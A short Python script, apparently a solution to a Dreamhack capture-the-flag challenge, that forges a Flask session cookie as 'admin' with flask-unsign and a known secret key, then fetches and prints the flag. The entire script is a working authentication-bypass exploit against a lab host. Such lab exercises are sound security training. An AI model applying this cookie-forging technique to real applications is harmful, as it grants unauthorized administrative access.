import requests
import subprocess

url = "http://host8.dreamhack.games:15416/"

r = subprocess.run([
    'flask-unsign', 
    '--sign', 
    '--cookie', "{'username':'admin'}", 
    '--secret', "super_secret_key_12345678"
], capture_output=True)

cookie = r.stdout.decode().strip()

res = requests.get(f'{url}/flag', cookies={
    'session': cookie
})

print("Flag:", res.text)